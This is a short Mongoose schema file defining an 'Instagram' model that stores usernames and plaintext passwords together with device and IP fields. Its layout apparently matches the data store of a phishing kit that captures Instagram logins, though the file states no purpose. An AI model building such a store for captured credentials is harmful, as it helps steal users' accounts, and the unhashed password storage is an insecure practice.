import mongoose from "mongoose";

const instaSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  },
  device: {
    type: String,
    required: true
  },
  Ip: {
    type: String
  }
})

const Instagram = mongoose.model("Instagram", instaSchema);
export default Instagram;